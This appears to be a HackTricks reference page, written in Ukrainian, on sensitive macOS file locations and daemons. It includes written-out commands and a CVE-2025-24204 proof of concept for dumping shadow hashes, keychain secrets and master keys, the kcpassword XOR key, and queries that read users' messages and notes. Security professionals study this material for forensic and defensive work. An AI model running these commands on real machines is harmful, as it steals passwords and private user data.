# Чутливі розташування macOS та цікаві демони

{{#include ../../../banners/hacktricks-training.md}}

## Паролі

### Тіньові паролі

Тіньовий пароль зберігається разом із конфігурацією користувача у plists, розташованих у **`/var/db/dslocal/nodes/Default/users/`**.\
За допомогою наведеної нижче oneliner можна dump-нути **всю інформацію про користувачів** (включно з інформацією про hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Скрипти на кшталт цього**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) або [**цього**](https://github.com/octomagon/davegrohl.git) можна використовувати для перетворення hash у **format** **hashcat**.

Альтернативний one-liner, який виведе creds усіх неслужбових облікових записів у format hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Ще один спосіб отримати `ShadowHashData` користувача — використати `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Цей файл **використовується лише**, коли система запущена в **single-user mode** (тобто не дуже часто).

### Keychain Dump

Зверніть увагу, що під час використання бінарного файлу `security` для **дампу розшифрованих паролів** користувачеві буде запропоновано кілька разів дозволити цю операцію.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
У сучасній macOS найцікавішими сховищами зазвичай є **`~/Library/Keychains/login.keychain-db`** і **`/Library/Keychains/System.keychain`**. Це файли на основі SQLite, але доступ до даних у відкритому вигляді все одно надається через **`securityd`**: викрадення необробленої БД переважно дає лише метадані та зашифровані блоки даних, якщо додатково не відновити пароль користувача, `SystemKey` або master key, що зберігається в пам'яті.<sup>[2]</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Судячи з цього коментаря [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), схоже, що ці інструменти більше не працюють у Big Sur.

### Огляд Keychaindump

Було розроблено інструмент під назвою **keychaindump** для вилучення паролів із keychain macOS, але він має обмеження в новіших версіях macOS, як-от Big Sur, що зазначено в [обговоренні](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Для використання **keychaindump** зловмиснику потрібно отримати доступ і підвищити привілеї до **root**. Інструмент використовує той факт, що keychain за замовчуванням розблоковується після входу користувача для зручності, даючи змогу застосункам отримувати до нього доступ без повторного введення пароля користувача. Однак якщо користувач вирішить блокувати свій keychain після кожного використання, **keychaindump** стає неефективним.

**Keychaindump** працює, націлюючись на конкретний процес під назвою **securityd**, який Apple описує як daemon для авторизації та криптографічних операцій і який має вирішальне значення для доступу до keychain. Процес вилучення передбачає пошук **Master Key**, отриманого з пароля користувача для входу. Цей ключ необхідний для читання файлу keychain. Щоб знайти **Master Key**, **keychaindump** сканує купу пам'яті **securityd** за допомогою команди `vmmap`, шукаючи потенційні ключі в областях, позначених як `MALLOC_TINY`. Для перевірки цих ділянок пам'яті використовується така команда:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Після виявлення потенційних master keys **keychaindump** шукає в heap-ах певний шаблон (`0x0000000000000018`), який вказує на кандидата на роль master key. Для використання цього ключа потрібні подальші кроки, зокрема деобфускація, як описано у вихідному коді **keychaindump**. Аналітикам, які працюють у цій області, слід зазначити, що критично важливі дані для розшифрування keychain зберігаються в пам’яті процесу **securityd**. Приклад команди для запуску **keychaindump**:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) можна використовувати для криміналістично коректного вилучення таких типів інформації з keychain OSX:

- Хешований пароль keychain, придатний для cracking за допомогою [hashcat](https://hashcat.net/hashcat/) або [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Маючи пароль для розблокування keychain, master key, отриманий за допомогою [volafox](https://github.com/n0fate/volafox) або [volatility](https://github.com/volatilityfoundation/volatility), чи unlock file, наприклад SystemKey, Chainbreaker також надасть паролі у відкритому тексті.

Без одного з цих методів розблокування Keychain Chainbreaker відобразить всю іншу доступну інформацію.

#### **Dump ключів keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump ключі keychain (з паролями) за допомогою SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Дамп ключів keychain (із паролями): cracking хешу**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Вивантаження ключів keychain (із паролями) за допомогою дампа пам’яті**

[Виконайте ці кроки](../index.html#dumping-memory-with-osxpmem), щоб створити **дамп пам’яті**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump ключів keychain (з паролями) за допомогою пароля користувача**

Якщо вам відомий пароль користувача, ви можете використовувати його, щоб **зробити dump і розшифрувати keychain, що належать користувачеві**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Майстер-ключ Keychain через entitlement `gcore` (CVE-2025-24204)

У macOS 15.0 (Sequoia) файл `/usr/bin/gcore` постачався з entitlement **`com.apple.system-task-ports.read`**, тому будь-який локальний адміністратор (або шкідливий підписаний застосунок) міг дампити пам'ять будь-якого процесу, навіть коли SIP/TCC були застосовані. Дамп `securityd` розкриває **майстер-ключ Keychain** у відкритому вигляді та дає змогу розшифрувати `login.keychain-db` без пароля користувача.<sup>[1]</sup>

**Швидке відтворення на вразливих збірках (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Подайте витягнутий hex-ключ до Chainbreaker (`--key <hex>`), щоб розшифрувати login keychain. Apple видалила entitlement у **macOS 15.3+**, тому це працює лише на непатчених збірках Sequoia або системах, де залишився вразливий binary.

### kcpassword

Файл **kcpassword** містить **пароль користувача для входу**, але лише якщо власник системи **увімкнув automatic login**. У такому разі користувач автоматично увійде в систему без запиту пароля (що не дуже безпечно).

Пароль зберігається у файлі **`/etc/kcpassword`**, зашифрований за допомогою XOR-ключа **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Якщо пароль користувача довший за ключ, ключ буде використано повторно.\
Це робить відновлення пароля досить простим, наприклад за допомогою таких scripts, як [**цей**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Цікава інформація в базах даних

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Сповіщення

До **Sequoia** сховище Notification Center зазвичай можна знайти в **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. У **Sequoia+** Apple перемістила його до захищеного TCC групового контейнера **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

Більшість цікавої інформації зберігається всередині стовпців **blob**, тому вам потрібно буде видобути цей вміст і перетворити його на щось зрозуміле для людини (`plutil -p -`, `strings` або невеликий парсер). Приклади швидкого triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Нещодавні проблеми з приватністю (NotificationCenter DB)

- У macOS **14.7–15.1** Apple зберігала вміст банерів у `db2/db` SQLite без належного редагування. CVE **CVE-2024-44292/44293/40838/54504** дозволяли будь-якому локальному користувачу прочитати текст сповіщень інших користувачів, просто відкривши DB (без запиту TCC).
- Apple пом'якшила цю проблему, перемістивши DB до `group.com.apple.usernoted` і захистивши її за допомогою TCC у новіших збірках Sequoia, тому в актуальних системах для її читання зазвичай потрібен відповідний контекст користувача або TCC bypass.<sup>[3]</sup>
- У застарілих endpoint'ах скопіюйте файли `db`, `db-wal` і `db-shm` разом перед оновленням або перезавантаженням, якщо хочете зберегти артефакти.

### Примітки

**Нотатки** користувачів можна знайти в `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Якщо наведений вище one-liner створює забагато шуму, експортуйте `ZICNOTEDATA.ZDATA`, розпакуйте його за допомогою gunzip і розберіть protobuf: зазвичай це надійніше, ніж безпосередньо запускати `strings` для SQLite.

### Фонові завдання / Елементи входу

Починаючи з **Ventura**, схвалені користувачем елементи входу та деякі фонові завдання відстежуються у сховищах **BTM**, таких як **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** і кеш системи з версіями **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Ці файли корисні для швидкого виявлення persistence, допоміжних інструментів і деяких фонових елементів, керованих MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Щодо persistence та внутрішніх механізмів BTM дивіться [сторінку auto-start locations](../../macos-auto-start-locations.md#login-items) і [нотатки Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Налаштування

У macOS налаштування застосунків розташовані в **`$HOME/Library/Preferences`**, а в iOS — у `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

У macOS cli tool **`defaults`** можна використовувати для **зміни файлу Preferences**.

**`/usr/sbin/cfprefsd`** заявляє XPC services `com.apple.cfprefsd.daemon` і `com.apple.cfprefsd.agent` та може викликатися для виконання таких дій, як зміна налаштувань.

## OpenDirectory permissions.plist

Файл `/System/Library/OpenDirectory/permissions.plist` містить дозволи, застосовані до атрибутів вузлів, і захищений SIP.\
Цей файл надає дозволи конкретним користувачам за UUID (а не uid), щоб вони могли отримувати доступ до певної чутливої інформації, зокрема `ShadowHashData`, `HeimdalSRPKey` і `KerberosKeys`:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Системні сповіщення

### Сповіщення Darwin

Основним daemon для сповіщень є **`/usr/sbin/notifyd`**. Щоб отримувати сповіщення, клієнти повинні зареєструватися через Mach port `com.apple.system.notification_center` (перевірити їх можна за допомогою `sudo lsmp -p <pid notifyd>`). Налаштування daemon задаються у файлі `/etc/notify.conf`.

Назви, що використовуються для сповіщень, є унікальними reverse DNS-нотаціями. Коли сповіщення надсилається на одну з них, його отримують клієнти, які вказали, що можуть його обробляти.

Поточний стан можна скинути (і переглянути всі назви), надіславши сигнал SIGUSR2 процесу notifyd і прочитавши створений файл: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Розподілений центр сповіщень

**Розподілений центр сповіщень**, основним бінарним файлом якого є **`/usr/sbin/distnoted`**, є ще одним способом надсилання сповіщень. Він надає деякі XPC-сервіси та виконує певні перевірки, щоб спробувати верифікувати клієнтів.

### Apple Push Notifications (APN)

У цьому випадку застосунки можуть реєструватися для отримання **topics**. Клієнт генерує token, звертаючись до серверів Apple через **`apsd`**.\
Після цього providers також генерують token і можуть підключатися до серверів Apple для надсилання повідомлень клієнтам. Ці повідомлення локально отримує **`apsd`**, який передає сповіщення застосунку, що очікує на нього.

Налаштування розташовані в `/Library/Preferences/com.apple.apsd.plist`.

Локальна база даних повідомлень у macOS розташована в `/Library/Application\ Support/ApplePushService/aps.db`, а в iOS — у `/var/mobile/Library/ApplePushService`. Вона містить 3 таблиці: `incoming_messages`, `outgoing_messages` і `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Також можна отримати інформацію про daemon і connections за допомогою:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Сповіщення користувача

Це сповіщення, які користувач має бачити на екрані:

- **`CFUserNotification`**: Ці API дають змогу показувати на екрані спливне вікно з повідомленням.
- **The Bulletin Board**: В iOS це показує банер, який зникає та зберігається в Notification Center.
- **`NSUserNotificationCenter`**: Це bulletin board iOS у macOS. У старіших версіях macOS база даних зазвичай розташована в `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; у Sequoia+ її було переміщено до `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Посилання

- [1] [HelpNetSecurity – entitlement macOS gcore дозволяв вилучення головного ключа Keychain (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – захист даних Keychain](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [9to5Mac – Apple відповіла на занепокоєння щодо конфіденційності бази даних Notification Center у macOS Sequoia](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
